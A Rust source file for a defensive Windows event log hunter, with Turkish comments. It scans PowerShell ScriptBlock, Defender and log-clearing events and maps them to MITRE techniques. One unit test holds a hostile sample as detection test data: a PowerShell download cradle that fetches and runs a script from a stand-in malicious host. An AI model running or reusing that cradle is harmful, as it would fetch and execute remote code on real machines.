use crate::engines::script_hunter::{ScriptHunter, ScriptThreatReport};
use anyhow::Result;
use serde::{Deserialize, Serialize};
use std::process::Command;

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct EventLogRecord {
    pub record_id: String,
    pub event_id: u32,
    pub log_name: String,
    pub time_created: String,
    pub severity: String,
    pub source: String,
    pub message_preview: String,
    pub full_message: String,
    pub is_suspicious: bool,
    pub mitre_technique: Option<String>,
    pub script_threat: Option<ScriptThreatReport>,
    pub details: String,
}

#[derive(Debug, Deserialize)]
struct RawWinEvent {
    #[serde(rename = "Id")]
    id: Option<u32>,
    #[serde(rename = "TimeCreated")]
    time_created: Option<serde_json::Value>,
    #[serde(rename = "Message")]
    message: Option<String>,
}

pub struct EventLogHunter;

impl EventLogHunter {
    /// PowerShell ScriptBlock olaylarını (Event ID 4104) sorgular ve ScriptHunter ile analiz eder
    pub fn scan_powershell_scriptblocks(max_events: usize) -> Result<Vec<EventLogRecord>> {
        let ps_cmd = format!(
            "Get-WinEvent -FilterHashtable @{{LogName='Microsoft-Windows-PowerShell/Operational'; Id=4104}} -MaxEvents {} -ErrorAction SilentlyContinue | Select-Object -Property Id, TimeCreated, Message | ConvertTo-Json -Compress",
            max_events
        );

        let records = Self::query_winevent_ps(&ps_cmd, "Microsoft-Windows-PowerShell/Operational", "PowerShell")?;
        Ok(records)
    }

    /// Windows Defender Tehdit Tespit ve Müdahale günlüklerini (Event ID 1116, 1117) sorgular
    pub fn scan_defender_detections(max_events: usize) -> Result<Vec<EventLogRecord>> {
        let ps_cmd = format!(
            "Get-WinEvent -FilterHashtable @{{LogName='Microsoft-Windows-Windows Defender/Operational'; Id=1116,1117}} -MaxEvents {} -ErrorAction SilentlyContinue | Select-Object -Property Id, TimeCreated, Message | ConvertTo-Json -Compress",
            max_events
        );

        let records = Self::query_winevent_ps(&ps_cmd, "Microsoft-Windows-Windows Defender/Operational", "Windows Defender")?;
        Ok(records)
    }

    /// Güvenlik Denetim Günlüğü Temizleme (Event ID 1102 - Log Cleared) olaylarını denetler
    pub fn scan_security_tampering(max_events: usize) -> Result<Vec<EventLogRecord>> {
        let ps_cmd = format!(
            "Get-WinEvent -FilterHashtable @{{LogName='Security'; Id=1102}} -MaxEvents {} -ErrorAction SilentlyContinue | Select-Object -Property Id, TimeCreated, Message | ConvertTo-Json -Compress",
            max_events
        );

        let records = Self::query_winevent_ps(&ps_cmd, "Security", "Microsoft-Windows-Security-Auditing")?;
        Ok(records)
    }

    /// Tüm kritik olay günlüklerini topluca tarar
    pub fn scan_all(limit_per_category: usize) -> Result<Vec<EventLogRecord>> {
        let mut results = Vec::new();

        if let Ok(mut ps_logs) = Self::scan_powershell_scriptblocks(limit_per_category) {
            results.append(&mut ps_logs);
        }
        if let Ok(mut def_logs) = Self::scan_defender_detections(limit_per_category) {
            results.append(&mut def_logs);
        }
        if let Ok(mut sec_logs) = Self::scan_security_tampering(limit_per_category) {
            results.append(&mut sec_logs);
        }

        // En yeniden en eskiye sırala
        results.sort_by(|a, b| b.time_created.cmp(&a.time_created));
        Ok(results)
    }

    /// Tekil bir olay günlüğü girdisini analiz eder (Birim testleri ve akış için)
    pub fn analyze_raw_event(
        event_id: u32,
        log_name: &str,
        source: &str,
        time_created: &str,
        message: &str,
    ) -> EventLogRecord {
        let mut is_suspicious = false;
        let mut severity = "Info".to_string();
        let mut mitre_technique = None;
        let mut script_threat = None;
        let mut details = String::new();

        let preview: String = message.chars().take(160).collect();

        match event_id {
            4104 => {
                // PowerShell ScriptBlock Logging
                if let Some(rep) = ScriptHunter::analyze_script(message, Some("EventID_4104")) {
                    is_suspicious = true;
                    severity = rep.severity.clone();
                    mitre_technique = Some(rep.mitre_technique.clone());
                    details = format!(
                        "Zararlı PowerShell ScriptBlock Tespit Edildi: {} [{}]",
                        rep.threat_name,
                        rep.matched_indicators.join(", ")
                    );
                    script_threat = Some(rep);
                } else {
                    details = "Standart PowerShell ScriptBlock yürütmesi (temiz).".to_string();
                }
            }
            1116 => {
                // Defender Malware Detection
                is_suspicious = true;
                severity = "Critical".to_string();
                mitre_technique = Some("T1204 - User Execution".to_string());
                details = format!("Windows Defender Zararlı Yazılım Tespiti: {}", preview);
            }
            1117 => {
                // Defender Malware Action Taken (Quarantine/Remove)
                is_suspicious = true;
                severity = "Warning".to_string();
                mitre_technique = Some("T1562 - Impair Defenses / Remediation".to_string());
                details = format!("Windows Defender Zararlı Müdahale Eylemi: {}", preview);
            }
            1102 => {
                // Audit Log Was Cleared
                is_suspicious = true;
                severity = "Critical".to_string();
                mitre_technique = Some("T1070.001 - Indicator Removal: Clear Windows Event Logs".to_string());
                details = "DİKKAT: Windows Güvenlik Olay Günlüğü silindi/temizlendi! Saldırgan izlerini örtmeye çalışıyor.".to_string();
            }
            4688 => {
                // Process Creation
                details = format!("Süreç oluşturuldu: {}", preview);
            }
            _ => {
                details = format!("Olay günlüğü kaydı: {}", preview);
            }
        }

        let rec_id = format!("{}-{}", event_id, chrono::Utc::now().timestamp_subsec_micros());

        EventLogRecord {
            record_id: rec_id,
            event_id,
            log_name: log_name.to_string(),
            time_created: time_created.to_string(),
            severity,
            source: source.to_string(),
            message_preview: preview,
            full_message: message.to_string(),
            is_suspicious,
            mitre_technique,
            script_threat,
            details,
        }
    }

    fn query_winevent_ps(ps_cmd: &str, log_name: &str, source: &str) -> Result<Vec<EventLogRecord>> {
        let output = Command::new("powershell")
            .args(["-NoProfile", "-NonInteractive", "-Command", ps_cmd])
            .output();

        let mut records = Vec::new();
        let out = match output {
            Ok(o) if o.status.success() => String::from_utf8_lossy(&o.stdout).trim().to_string(),
            _ => return Ok(records),
        };

        if out.is_empty() || out == "null" {
            return Ok(records);
        }

        // PowerShell JSON array or single object
        if out.starts_with('[') {
            if let Ok(raw_list) = serde_json::from_str::<Vec<RawWinEvent>>(&out) {
                for item in raw_list {
                    if let Some(rec) = Self::convert_raw_event(item, log_name, source) {
                        records.push(rec);
                    }
                }
            }
        } else if out.starts_with('{') {
            if let Ok(raw_item) = serde_json::from_str::<RawWinEvent>(&out) {
                if let Some(rec) = Self::convert_raw_event(raw_item, log_name, source) {
                    records.push(rec);
                }
            }
        }

        Ok(records)
    }

    fn convert_raw_event(item: RawWinEvent, log_name: &str, source: &str) -> Option<EventLogRecord> {
        let event_id = item.id?;
        let message = item.message.unwrap_or_default();
        let time_str = match item.time_created {
            Some(serde_json::Value::String(s)) => s,
            Some(serde_json::Value::Object(map)) => {
                map.get("value")
                    .and_then(|v| v.as_str())
                    .unwrap_or("")
                    .to_string()
            }
            _ => chrono::Utc::now().to_rfc3339(),
        };

        Some(Self::analyze_raw_event(
            event_id,
            log_name,
            source,
            &time_str,
            &message,
        ))
    }
}

#[cfg(test)]
pub mod tests {
    use super::*;

    #[test]
    fn test_eventlog_clean_powershell_scriptblock() {
        let msg = "Write-Host 'Hello world from maintenance task'";
        let rec = EventLogHunter::analyze_raw_event(
            4104,
            "Microsoft-Windows-PowerShell/Operational",
            "PowerShell",
            "2026-09-17T00:00:00Z",
            msg,
        );

        assert_eq!(rec.event_id, 4104);
        assert!(!rec.is_suspicious);
        assert_eq!(rec.severity, "Info");
        assert!(rec.script_threat.is_none());
    }

    #[test]
    fn test_eventlog_malicious_scriptblock_cradle() {
        let msg = "IEX (New-Object Net.WebClient).DownloadString('http://evil.malware.com/payload.ps1')";
        let rec = EventLogHunter::analyze_raw_event(
            4104,
            "Microsoft-Windows-PowerShell/Operational",
            "PowerShell",
            "2026-09-17T00:00:00Z",
            msg,
        );

        assert_eq!(rec.event_id, 4104);
        assert!(rec.is_suspicious);
        assert!(rec.severity.eq_ignore_ascii_case("Critical"));
        assert!(rec.script_threat.is_some());
        assert!(rec.details.contains("DownloadString") || rec.details.contains("Zararlı"));
    }

    #[test]
    fn test_eventlog_audit_cleared_tampering() {
        let msg = "The audit log was cleared by Administrator.";
        let rec = EventLogHunter::analyze_raw_event(
            1102,
            "Security",
            "Microsoft-Windows-Security-Auditing",
            "2026-09-17T00:00:00Z",
            msg,
        );

        assert_eq!(rec.event_id, 1102);
        assert!(rec.is_suspicious);
        assert_eq!(rec.severity, "Critical");
        assert!(rec.mitre_technique.as_deref().unwrap().contains("T1070.001"));
    }

    #[test]
    fn test_eventlog_defender_detection_event() {
        let msg = "Microsoft Defender Antivirus has detected malware or other potentially unwanted software. Name: Trojan:Win32/Wacatac.B!ml";
        let rec = EventLogHunter::analyze_raw_event(
            1116,
            "Microsoft-Windows-Windows Defender/Operational",
            "Windows Defender",
            "2026-09-17T00:00:00Z",
            msg,
        );

        assert_eq!(rec.event_id, 1116);
        assert!(rec.is_suspicious);
        assert_eq!(rec.severity, "Critical");
        assert!(rec.details.contains("Wacatac"));
    }
}
